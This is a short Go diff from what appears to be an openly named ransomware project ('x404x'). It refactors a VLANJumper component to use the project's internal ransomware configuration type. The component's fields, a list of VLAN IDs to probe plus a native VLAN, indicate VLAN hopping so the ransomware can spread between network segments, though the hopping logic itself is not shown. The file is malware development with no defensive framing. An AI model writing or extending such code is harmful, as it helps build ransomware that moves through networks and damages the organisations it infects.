@@ -1,9 +1,10 @@
 package ransomware
 
+import rw "github.com/ruby570bocadito/x404x/internal/ransomware"
+
 import (
 	"fmt"
 	"net"
-	"os"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -11,13 +12,13 @@ import (
 )
 
 type VLANJumper struct {
-	config       *RansomwareConfig
+	config       *rw.RansomwareConfig
 	interfaces   []string
 	vlanRange    []int
 	nativeVLAN   int
 }
 
-func NewVLANJumper(cfg *RansomwareConfig) *VLANJumper {
+func NewVLANJumper(cfg *rw.RansomwareConfig) *VLANJumper {
 	return &VLANJumper{
 		config: cfg,
 		vlanRange: []int{1, 10, 20, 50, 100, 200, 500, 1000},
